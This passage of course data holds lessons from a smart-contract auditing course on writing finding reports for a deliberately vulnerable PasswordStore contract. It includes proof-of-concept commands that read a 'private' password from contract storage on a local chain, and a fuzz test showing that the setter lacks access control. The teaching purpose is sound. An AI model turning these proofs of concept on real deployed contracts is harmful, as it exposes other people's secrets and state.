          Wow! Our coverage looks great...right? It's important to note that coverage may be a vanity metric and not truly representative of what's being tested for. If we look closely at the tests included, we can see the a major vulnerability we found (`Access Control`) wasn't tested for at all.

          ```js
          function test_owner_can_set_password() public {
              vm.startPrank(owner);
              string memory expectedPassword = "myNewPassword";
              passwordStore.setPassword(expectedPassword);
              string memory actualPassword = passwordStore.getPassword();
              assertEq(actualPassword, expectedPassword);
          }

          function test_non_owner_reading_password_reverts() public {
              vm.startPrank(address(1));

              vm.expectRevert(PasswordStore.PasswordStore__NotOwner.selector);
              passwordStore.getPassword();
          }
          ```

          In addition to the above, tests aren't going to catch problems with documentation, or erroneous business logic. It's important not to assume things are fine because our framework tells us so.

          ### Wrap Up

          We're really progressing through this process well and we're ready to write a report for each of our findings. We'll cover this in our next lesson!
        description: 'Validating protocol tests and coverage, emphasizing thoroughness!'
      -
        id: 96f8af07-f18f-4682-864f-cef0a6abc240
        type: new_lesson
        enabled: true
        title: 'Writing an amazing finding'
        slug: finding-report
        duration: 4
        video_url: DYHxa01R7uH6pzvyGoeEZXZqb7632xGQdNEVkS3B4Ls00
        raw_markdown_url: /routes/security/3-first-audit/13-finding-report/+page.md
        markdown_content: |-
          ---
          title: Writing an amazing finding report
          ---

          _Follow along with this video:_

          ---

          ### Phase #4: Reporting

          After the identification phase, we are tasked with communicating our findings to the protocol. This phase is crucial on several levels:

          1. We need to convince the protocol that the identified vulnerabilities are valid.
          2. We must illustrate how severe/impactful the issue is
          3. We should also help the protocol with mitigation strategies.

          By effectively communicating this information, we position ourselves as educators, helping the protocol understand **why** these vulnerabilities are issues, **why** they were overlooked, and **how** to fix them to avoid running into the same issues in the future.

          ### Writing Your First Finding

          Now comes an incredibly exciting part - doing a minimalistic write up of the vulnerabilities you've found.

          We've prepared a finding template for you, accessible in the course's [**GitHub Repo**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/finding_layout.md).

          Open a new file in your project titled `audit-data`, download and copy `finding_layout.md` into this folder.

          It should look like this when previewed (`CTRL + SHIFT + V`):

          ---

          ### [S-#] TITLE (Root Cause + Impact)

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          You can customize this however you like, but this minimalistic template is a great starting point.

          > Remember our goals in this report:
          >
          > - illustrate that the issue is valid
          > - make clear the issue's severity and impact
          > - offer recommendation for mitigation

          ### Wrap up

          Create a copy of `findings_layout.md`, name it `findings.md` and let's start filling these sections out.

          Our first finding is `Private variable's aren't actually private!`
        description: 'Patrick explains reporting process. How to create a detailed report with Markdown. Discusses importance of issues & solutions.'
      -
        id: 508a9bbd-9427-41bb-a5be-3e6c63cfeaba
        type: new_lesson
        enabled: true
        title: 'Writing an amazing finding: Title'
        slug: an-amazing-title
        duration: 2
        video_url: 8DClGnjCCFH00W4MEvC00EB7oTDcAL02QzZnxqOR5U0002Cs
        raw_markdown_url: /routes/security/3-first-audit/14-an-amazing-title/+page.md
        markdown_content: |-
          ---
          title: An Amazing Title
          ---

          _Follow along with this video:_

          ---

          ### The report so far:

          ---

          ### [S-#] TITLE (Root Cause + Impact)

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          ### Title

          The first thing we need to fill out is our report's title. We want to be concise while still communicating important details of the vulnerability. A good rule of thumb is that your title should include:

          > Root Cause + Impact

          So, we ask ourselves _what is the root cause of this finding, and what impact does it have?_

          For this finding the root cause would be something aking to:

          - **Storage variables on-chain are publicly visible**

          and the impact would be:

          - **anyone can view the stored password**

          Let's work this into an appropriate title for our finding (don't worry about `[S-#]`, we'll explain this more later).

          ---

          ```
          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**
          ```

          ---

          ### Wrap Up

          The easiest way to ensure a clear title of your report is to be concise and adhere to the rule of thumb.

          > Root Cause + Impact

          One step down! Let's move onto the description section next
        description: 'Learn how to write better findings: focus on repetition, use clear titles with root causes & impact, example of effective title creation in a security report.'
      -
        id: 9620492b-6c47-44bb-80c4-48b43dd53f94
        type: new_lesson
        enabled: true
        title: 'Writing an amazing finding: Description'
        slug: description
        duration: 4
        video_url: CbPeHWYYC3Ksldo9pLi00J008mQCYO2epKYrdxpWTgGds
        raw_markdown_url: /routes/security/3-first-audit/15-description/+page.md
        markdown_content: |-
          ---
          title: Description
          ---

          _Follow along with this video:_

          ---

          ### The report so far:

          ---

          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          Alright, `title` done. What's next? Let's take a look at description and impact.

          ### Description

          Our goal here is to describe the vulnerability consicely while clearly illustrating the problem. A description for our finding here might look like this.

          ---

          ```
          **Description:** All data stored on chain is public and visible to anyone. The s_password variable is intended to be hidden and only accessible by the owner through the getPassword function.

          I show one such method of reading any data off chain below.
          ```

          ---

          This looks good, but we can do even better. The bigger a codebase, the more our variables and references are going to get lost. We can fight this with a little bit of markdown formatting and standardizing our naming conventions.

          <img src="/security-section-3/15-description/description1.png" style="width: 100%; height: auto;">

          Consider the above adjustments to our references in the description. By wrapping the variable and function name in backticks we're able to highlight them. Additionally we're prepended the names with reference to the contract in which they're found.

          ---

          ```
          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.

          I show one such method of reading any data off chain below.
          ```

          ---

          This is the kind of clarity we should strive for in our reports!

          ### Impact

          The impact is fairly self-evident, but to articulate it:

          ```
          **Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.
          ```

          Putting things together, our report so far should look like this

          ---

          ```
          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.

          I show one such method of reading any data off chain below.

          **Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.

          **Proof of Concept:**

          **Recommended Mitigation:**
          ```

          ---

          ### Wrap Up

          In the next lesson, we're going to go over `Proof of Concept` sometimes called `Proof of Code`. This is a critical section of our report where we show, irrefutably, that the vulnerability exists and has considerable impact.

          This is the section that prevents protocols from disregarding legitmate concerns.

          Let's get to the code!
        description: 'Writing a description for our report detailing all the necessary information about our discovered vulnerability.'
      -
        id: b77665e5-0308-4fc4-b3d3-0077c840bcae
        type: new_lesson
        enabled: true
        title: 'Writing an amazing finding: Proof of code'
        slug: proof-of-code
        duration: 3
        video_url: ZYae2hc9owgu7zUQiASt6KfTp7DZQIGMu6eFuY1Uf2w
        raw_markdown_url: /routes/security/3-first-audit/16-proof-of-code/+page.md
        markdown_content: |-
          ---
          title: Proof of Code
          ---

          _Follow along with this video:_

          ---

          ### The report so far:

          ---

          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.

          I show one such method of reading any data off chain below.

          **Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          ### Proof of Code/Concept

          Our report is looking great, but the next section, `Proof of Code/Concept`, is imperative. Let's go over how we programmatically prove the claim we're making - that anyone can read the protocol's stored password.

          First we need a local chain running.

          ```bash
          forge anvil
          ```

          > Note: Most PoC's won't require a local blockchain

          Next we need to deploy our protocol, fortunately, PasswordStore has a `make` command set up for us. Note that their deploy script is setting the password `myPassword` in the process. Open a new terminal and run the following.

          ```bash
          make deploy
          ```

          Foundry allows us to check the storage of a deployed contract with a very simple `cast` command. For this we'll need to recall to which storage slot the `s_password` variable is assigned.

          <img src="/security-section-3/16-proof-of-code/proof-of-code1.png" style="width: 100%; height: auto;">

          With this consideration we can run the command `cast storage <address> <storageSlot>` like this (_your address may be different_).

          ```bash
          cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1
          ```

          We should receive an output similar to this:

          ```
          `0x6d7950617373776f726400000000000000000000000000000000000000000014`
          ```

          This is the bytes form of the data at `storage slot 1`. By using another convenient Foundry command we can now decode this data.

          ```bash
          cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
          ```

          Our output then becomes:

          ```
          myPassword
          ```

          And we've done it. In a few quick commands we've shown that the data our client is expecting to keep hidden on chain is accessible to anyone. Let's add these steps as proof to our report. Things are getting long, so I've collapsed the report examples going forward!

          <details closed>
          <summary>Finding Report</summary>
          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private
          <br>
          <br>
          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.
          <br>
          <br>
          I show one such method of reading any data off chain below.
          <br>
          <br>
          **Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.
          <br>
          <br>
          **Proof of Concept:**The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.

              Create a locally running chain

          make anvil

              Deploy the contract to the chain

          make deploy

              Run the storage tool

          We use 1 because that's the storage slot of s_password in the contract.

              cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545

          You'll get an output that looks like this:

              0x6d7950617373776f726400000000000000000000000000000000000000000014

          You can then parse that hex to a string with:

              cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014

          And get an output of:

              myPassword

          <br>
          **Recommended Mitigation:**

          </details>

          ### Wrap Up

          We've one more section in our report to fill out, the `Recommended Mitigations`. This is where we get a chance to illustrate our experience and bring value to the process by offering our expert advice on how rectify the problems faced by this vulnerability.

          Let's do it.
        description: "Writing a proof of code to indisputably prove the vulnerabilities we've found!"
      -
        id: dce5ed84-3e1c-42f7-b8e8-9cf42bdab6e5
        type: new_lesson
        enabled: true
        title: 'Writing an amazing finding: Recommended Mitigation'
        slug: recommended-mitigation
        duration: 2
        video_url: Lia01zwicRN2QHaa2K1QOw00jExxTtuEJM5jzkwYaQNPQ
        raw_markdown_url: /routes/security/3-first-audit/17-recommended-mitigation/+page.md
        markdown_content: |-
          ---
          title: Recommended Mitigation
          ---

          _Follow along with this video:_

          ---

          ### The report so far:

          ---

          <details closed>
          <summary>Finding Report</summary>

          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.

          I show one such method of reading any data off chain below.

          **Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.

          **Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.

          Create a locally running chain

              make anvil

          Deploy the contract to the chain

              make deploy

          Run the storage tool

              cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545

          _We use 1 because that's the storage slot of `PasswordStore::s_password`._

          You'll get an output that looks like this:

              0x6d7950617373776f726400000000000000000000000000000000000000000014

          You can then parse that hex to a string with:

              cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014

          And get an output of:

              myPassword

          **Recommended Mitigation:**

          </details>

          ---

          ### Recommended Mitigation

          We're nearly there. Next we have to pass on our expert experience with a recommendation that will keep this protocol safe!

          This finding in `PasswordStore` kinda leaves us in a tough spot. We can't just suggest an adjustment to the code to fix things - the problem is fundamentally tied to the goals/architecture of the protocol. A recommendation in a situation like this might look like:

          ---

          ```
          **Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.
          ```

          ---

          I challenge you to write something you'd think is more appropriate, or better expresses what the protocol could do in a situation like this!

          Here's our report now:

          <details closed>
          <summary>Finding Report</summary>
          <br>
          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private
          <br>
          <br>
          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.
          <br>
          <br>
          I show one such method of reading any data off chain below.
          <br>
          <br>
          **Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.
          <br>
          <br>
          **Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.
          <br>
          <br>

          Create a locally running chain

              make anvil

          Deploy the contract to the chain

              make deploy

          Run the storage tool

              cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545

          <br>
          *We use 1 because that's the storage slot of `PasswordStore::s_password`.*
          <br>
          <br>
          You'll get an output that looks like this:

              0x6d7950617373776f726400000000000000000000000000000000000000000014

          You can then parse that hex to a string with:

              cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014

          And get an output of:

              myPassword

          <br>
          **Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.

          </details>

          ### Wrap Up

          Our report is looking so professional! Let's recap everything in the next lesson before we move on to the next vulnerability we found.
        description: 'Writing a great recommended mitigation for the issues found in PasswordStore!'
      -
        id: 4e462cd4-3ee0-4a34-ac26-a4d81a882732
        type: new_lesson
        enabled: true
        title: 'Finding Writeup'
        slug: finding-writeup
        duration: 2
        video_url: CtEwzh2krYHieRIi4Te5lA29h4r5e6Cgmtbm02YDutxc
        raw_markdown_url: /routes/security/3-first-audit/18-finding-writeup/+page.md
        markdown_content: |-
          ---
          title: Finding Writeup Recap
          ---

          _Follow along with this video:_

          ---

          ### Our Finding Report

          <details closed>
          <summary>Finding Report</summary>

          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          **Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.

          I show one such method of reading any data off chain below.

          **Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.

          **Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.

          Create a locally running chain

              make anvil

          Deploy the contract to the chain

              make deploy

          Run the storage tool

              cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545

          _We use 1 because that's the storage slot of `PasswordStore::s_password`._

          You'll get an output that looks like this:

              0x6d7950617373776f726400000000000000000000000000000000000000000014

          You can then parse that hex to a string with:

              cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014

          And get an output of:

              myPassword

          **Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.

          </details>

          ---

          ### Recap

          Our finding report looks great. All we're missing is the severity (`[S-#]`), but we'll get to that shortly. Let's recap some of the important aspects we went over while compiling this report.

          ### The Write-Up Structure

          1. **Title**: A title should be succinct and clear. A best practice is to adhere to the `Root Cause + Impact` rule of thumb.

          2. **Description**: This is a brief explanation of the problem, widely enhanced by using markdown and clear naming conventions for our variables.

          3. **Impact**: The impact should be clear and concise in how, in plain language, is describes the affects the vulnerability has on the protocol.

          4. **Proof of Code**: A vital part of a good report, this section proves how someone could exploit the detailed vulnerability by walking through the process programmatically.

          5. **Recommended Mitigation**: This is where our expertise shines. Our focus in the recommendation should be in making the protocol more secure, advising specific changes or considerations that should be made to mitigate the reported vulnerability and adding value by offering solutions instead of just pointing out problems.

          ### Wrap Up

          Our report looks awesome, but there's more to do. No stopping now, let's dive into our `Access Control` finding as see what a finding report for it would look like. This shouldn't take long, we're practically experts already.
        description: 'Recap finding write ups: Structured format, clear communication, specific details (code snippets).'
      -
        id: 96541336-7d2a-4223-ae4b-cd0038bc99df
        type: new_lesson
        enabled: true
        title: 'Access Control Writeup'
        slug: access-control-writeup
        duration: 3
        video_url: fpBbCzn33lNwFO002faSAcVjlHyfLhfI9EU02juP5QlOg
        raw_markdown_url: /routes/security/3-first-audit/19-access-control-writeup/+page.md
        markdown_content: |-
          ---
          title: Access Control Write-up
          ---

          _Follow along with this video:_

          ### Clean Slate

          We've got the experience now, let's add a clean template to our `findings.md` for our `Access Control` finding and start filling this out together.

          A reminder of the function in question and our empty template:

          ```js
          /*
               * @notice This function allows only the owner to set a new password.
               * @param newPassword The new password to set.
               */
              function setPassword(string memory newPassword) external {
                  s_password = newPassword;
                  emit SetNetPassword();
              }
          ```

          ---

          ### [S-#] TITLE (Root Cause + Impact)

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          ### Title

          We know the rule of thumb (`Root Cause + Impact`). Let's ask ourselves, `What is the root cause of this vulnerability?` and `What is the impact of this?`

          - **Root Cause:** `setPassword` has no access control
          - **Impact:** non-owner can change the password.

          So, our `Title` might look like this

          ```
          [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password
          ```

          ### Description

          I challenge you to write your own description for this vulnerability! Remember, it should be clear and concise, describing things in detail in plain language. When you're done, click below to see mine.

          <details open>
          <summary>My Description</summary>

          **Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`

          ```js
          function setPassword(string memory newPassword) external {
              // @Audit - There are no Access Controls.
              s_password = newPassword;
              emit SetNewPassword();
          }
          ```

          </details>

          ### Impact

          The impact of our vulnerability should be pretty easy. Let's write it out now.

          ```
          **Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality
          ```

          Let's put things together in our report so far.

          ---

          ```
          ### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          **Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`

          '''
          function setPassword(string memory newPassword) external {
              // @Audit - There are no Access Controls.
              s_password = newPassword;
              emit SetNewPassword();
          }
          '''

          **Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality

          **Proof of Concept:**

          **Recommended Mitigation:**
          ```

          ---

          ### Wrap Up

          Already our report looks incredibly professional. Next lesson we're applying our knowledge to construct a `Proof of Code`. Don't stop now!
        description: "Add missing access control in PasswordStore's set password function. Use code examples & tips on markdown formatting."
      -
        id: 53ba4e98-466b-4b5f-bdc3-28bc3fba6385
        type: new_lesson
        enabled: true
        title: 'Missing Access Controls Proof Of Code'
        slug: missing-access-controls-proof-of-code
        duration: 5
        video_url: ZoLuxe2JHLCa01K1CkZdQxTgbV1H9pg7yk00beEL023Q54
        raw_markdown_url: /routes/security/3-first-audit/20-missing-access-controls-proof-of-code/+page.md
        markdown_content: |-
          ---
          title: Missing Access Controls Proof of Code
          ---

          _Follow along with this video:_

          ---

          ### Report so far

          <details closed>
          <summary>Access Control Report</summary>

          ### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          **Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`

          function setPassword(string memory newPassword) external {
          // @Audit - There are no Access Controls.
          s_password = newPassword;
          emit SetNewPassword();
          }

          **Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality

          **Proof of Concept:**

          **Recommended Mitigation:**

          </details>

          ---

          ### Proof of Concept/Proof of Code

          While this vulnerability may seem obvious, often it isn't. PoC's are valuable in proving that our claim that the protocol is at risk is valid and a serious concern.

          Let's write a `fuzz test` to check if in fact addresses other than the owner are able to call `setPassword`.

          ```js
              function test_anyone_can_set_password(address randomAddress) public {
                  vm.assume(randomAddress != owner);
                  vm.startPrank(randomAddress);
                  string memory expectedPassword = "myNewPassword";
                  passwordStore.setPassword(expectedPassword);

                  vm.startPrank(owner);
                  string memory actualPassword = passwordStore.getPassword();
                  assertEq(actualPassword, expectedPassword);
              }
          ```

          Foundry will pass this function random addresses to see if the assert holds, based on the number of runs we've configured.

          <img src="/security-section-3/20-missing-access-controls-proof-of-code/access-control1.png" style="width: 100%; height: auto;">

          We can see that through 256 runs, our fuzz test passed! So indeed any address was able to call our `setPassword` function!.

          ### Recommended Mitigations

          The mitigation of this is pretty clear - add access control to this function.

          Let's add our test as a `proof of code` as well as our `recommended mitigation` to our report.

          <details closed>
          <summary>Access Control Report</summary>

          ```
          ### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          **Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`

          '''js
          function setPassword(string memory newPassword) external {
              // @Audit - There are no Access Controls.
              s_password = newPassword;
              emit SetNewPassword();
          }
          '''

          **Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality

          **Proof of Concept:** Add the following to the PasswordStore.t.sol test file:

          '''js
          function test_anyone_can_set_password(address randomAddress) public {
                  vm.assume(randomAddress != owner);
                  vm.startPrank(randomAddress);
                  string memory expectedPassword = "myNewPassword";
                  passwordStore.setPassword(expectedPassword);

                  vm.startPrank(owner);
                  string memory actualPassword = passwordStore.getPassword();
                  assertEq(actualPassword, expectedPassword);
              }
          '''

          **Recommended Mitigation:** Add an access control conditional to `PasswordStore::setPassword`.

          '''js
          if(msg.sender != s_owner){
              revert PasswordStore__NotOwner();
          }
          '''
          ```

          > Pro-tip: Use the dropdowns, like you've seen in these lessons, in your reports to hide big blocks of code.

          <details>
          <summary>Here's the syntax</summary>

          > ```
          > <details>
          > <summary>Code</summary>
          > '''js
          > function test_anyone_can_set_password(address >randomAddress) public {
          >        vm.assume(randomAddress != owner);
          >        vm.startPrank(randomAddress);
          >        string memory expectedPassword = "myNewPassword";
          >        passwordStore.setPassword(expectedPassword);
          >
          >        vm.startPrank(owner);
          >        string memory actualPassword = passwordStore.>getPassword();
          >        assertEq(actualPassword, expectedPassword);
          >    }
          > '''
          > </details>
          > ```

          </details>
          </details>

          ### Wrap Up

          That's two findings down. Repetition is what will strengthen these skills and make writting these reports second nature. As we saw in this lesson, security reviewers even get to do a little coding üòã.

          Let's move on to our third finding, this one should be quick!
        description: 'Vulnerability proof: Write test case using the protocols test suite'
      -
        id: defb06de-a27a-4658-8166-d0de739bb413
        type: new_lesson
        enabled: true
        title: 'Finding Writeup Docs'
        slug: finding-writeup-docs
        duration: 3
        video_url: u1anf3HQb47og5FDQicBK29BMfrCQ9vMXNkD57Xg00ZM
        raw_markdown_url: /routes/security/3-first-audit/21-finding-writeup-docs/+page.md
        markdown_content: |-
          ---
          title: Finding Writeup Documentation Fix
          ---

          _Follow along with this video:_

          ---

          ### Final Finding

          Our last finding is `informational` in nature (we'll learn more about what that means when we go over severities), but in essence - it's not very impactful, but it's still an issue and we should report it.

          You'll learn with experience that informational and gas findings don't generally require extensive write ups, but for now, let's treat this like any other finding. Fresh template time!

          ---

          ### [S-#] TITLE (Root Cause + Impact)

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          ### Title

              Remember the rule of thumb: `Root Cause + Impact`

          - **Root Cause** - NatSpec describes a parameter that doesn't exist
          - **Impact** - NatSpec is incorrect

          So our title should look something like this:

              **Title:** [S-#] The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.

          Easy.

          ### Description

          Here we can just paste the problematic section of the code and briefly describe the problem.

              **Description:**
              '''
              /*
               * @notice This allows only the owner to retrieve the password.
              @> * @param newPassword The new password to set.
               */
              function getPassword() external view returns (string memory) {}
              '''

              The `PasswordStore::getPassword` function signature is `getPassword()` while the natspec says it should be `getPassword(string)`.

          ### Impact

          Impact of course is:

              **Impact** The natspec is incorrect

          ### Proof of Concept

          This section isn't actually needed for a report like this, so we'll omit it.

          ### Recommended Mitigation

          This one should be obvious to us as well. We recommend the documentation is made accurate. Let's add it to the report.

              **Recommended Mitigation:** Remove the incorrect natspec line

          We can use a fun markdown trick to illustrate the suggested changes.

          ```diff
              /*
               * @notice This allows only the owner to retrieve the password.
          -     * @param newPassword The new password to set.
               */
          ```

          _You can achieve this using the below syntax_

              ```diff
              + line you want to add (shown in green)
              - line you want to remove (shown in red)
              ```

          Let's put everything together into a report now.

          <details open>
          <summary>Finding #3 Report</summary>

          ```
          [S-#] The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.

          **Description:**
              '''
              /*
               * @notice This allows only the owner to retrieve the password.
              @> * @param newPassword The new password to set.
               */
              function getPassword() external view returns (string memory) {}
              '''

              The `PasswordStore::getPassword` function signature is `getPassword()` while the natspec says it should be `getPassword(string)`.

          **Impact:** The natspec is incorrect

          **Recommended Mitigation:** Remove the incorrect natspec line.

          '''diff
              /*
               * @notice This allows only the owner to retrieve the password.
          -     * @param newPassword The new password to set.
               */
          '''

          ```

          </details>

          ### Wrap Up

          I told you this one would be quick. We nailed it. Let's look at how we can use AI to polish things up for us when we need it.
        description: 'Writing up our finding for incorrect NatSpec!'
      -
        id: eb3162ff-7724-4efc-84cf-89cf6cb77889
        type: new_lesson
        enabled: true
        title: 'Augmented Report With Ai'
        slug: augmented-report-with-ai
        duration: 3
        video_url: LF8ECfsk7E025bCFXcT9KnDYDhOvknIL01UeNkiZJFCwQ
        raw_markdown_url: /routes/security/3-first-audit/22-augmented-report-with-ai/+page.md
        markdown_content: |-
          ---
          title: Augmented Report with AI
          ---

          _Follow along with this video:_

          ---

          ### Using AI to Polish things up

          AI's shouldn't relied upon for everything. They hallucinate and can/will make mistakes. With that said - they are great at writing reports and serving as a sanity check for security researchers.

          It's possible we're not confident in our write up, or our grammar or spelling is weak. This is where AI can really shine.

          ### Proper Prompting

          The key to getting a decent response from an AI model (like ChatGPT), is to give it a decent prompt. Formatting and clarity go a long way.

          In our care we want the AI to proof read our report and suggest grammar and formatting changes. It's best to give the AI a bit of context.

          ```
          The following is a markdown write-up of a findiing in a smart contract codebase, can you help me make sure it is grammatically correct and formatted nicely?

          ---
          PASTE-REPORT HERE
          ---
          ```

          A prompt like the above will give the AI clear context and clear delineation between your request and the data to analyze (your findings report).

          > Note: The AI is going to give you something that _looks_ great at first glance. It's important to double check the AI's suggestions for accuracy. Don't simply copy over it's suggested implementation, this is very risky.

          ### Wrap Up

          Artificial Intelligence, through tools like ChatGPT, can significantly streamline technical write-ups. It adds a layer of quality control, ensuring that your findings read well, look good and most importantly, communicate effectively.

          Remember to use these tools to your advantage when drafting complex technical reports. But as we've learnt, always remember to cross-check their work to ensure it is free from errors.
        description: 'Using AI to improve our writing and grammar.'
      -
        id: 0f6e1ddc-d24a-4203-89cb-fb1ce362312b
        type: new_lesson
        enabled: true
        title: 'Quick Primer On What We Are Learning Next'
        slug: quick-primer-on-what-we-are-learning-next
        duration: 2
        video_url: 01e3dSk89WqeZhvPuvu5LZmNq3bd849eSDUkqwvO4t3Q
        raw_markdown_url: /routes/security/3-first-audit/23-quick-primer-on-what-we-are-learning-next/+page.md
        markdown_content: |-
          ---
          title: Quick Primer on What We Are Learning Next
          ---

          _Follow along with this video:_

          ---

          ### What comes next?

          Alright, we've made significant progress already. Reflecting on our development journey, we have notched up three substantial findings which are currently in our repository. However, our to-do list isn't finished yet. We still have two crucial aspects to iron out.

          First, our three findings need to be appended with their respective severity ratings. We're going to look into how best to determine a findings severity and adjust our report to reflect these assessments.

          Secondly, we need to convert our `findings.md` - a markdown file - into a professional-looking PDF that can be shared with protocols, and showcased on our portfolio. The PDF's we'll be creating are visible on the course's [**GitHub Repo**](https://github.com/Cyfrin/3-passwordstore-audit/blob/audit-data/audit-data/report.pdf), so check them out.

          Let's get started with `determining a finding's severity`.

          <img src="/security-section-3/23-quick-primer/primer1.png" style="width: 100%; height: auto;">
        description: 'Audit data, severity ratings, PDF report creation. Instructions by Patrick on accomplishing tasks using tools & resources.'
      -
        id: c26e36b0-c803-49f8-8b99-3a29563ef40e
        type: new_lesson
        enabled: true
        title: 'Severity Rating Introduction'
        slug: severity-rating-introduction
        duration: 4
        video_url: 02GntIjVRQZvnqgYavxGEWbMzNoZ98an31qf02BG6qDak
        raw_markdown_url: /routes/security/3-first-audit/24-severity-rating-introduction/+page.md
        markdown_content: |-
          ---
          title: Severity Rating Introduction
          ---

          _Follow along with this video:_

          ---

          ### How to Evaluate a Finding's Severity

          For this lesson we'll be referencing the [**CodeHawks Documentation**](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity). There's a section specifically outlining `How to Evaluate a Finding Severity` and we'll be leveraging that methodology here.

          We'll be breaking our severities into `High`, `Medium` and `Low`. Some security researchers will include a `Critical` severity, if they believe a situation warants one, but we'll stick with these 3 for now.

          ### Impact: High, Medium, and Low

          Determining the category comes down to two elements: the likelihood of an attack and the impact of the attack. Though these can be subjective, there are some standard guidelines.

          1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.
          2. **Medium Impact**: `funds` are `indirectly at risk` or there‚Äôs `some level of disruption` to the protocol‚Äôs functionality.
          3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.

          Think of it in terms of user experience - _how pissed off would users be if an attack happened?_

          ### Likelihood: High, Medium, and Low

          Assessing the likelihood of a certain event happening can be somewhat subjective. That said, consider the following:

          1. **High Likelihood**: Highly probably to happen.
             - a hacker can call a function directly and extract money
          2. **Medium Likelihood**: Might occur under specific conditions.
             - a peculiar ERC20 token is used on the platform.
          3. **Low Likelihood**: Unlikely to occur.
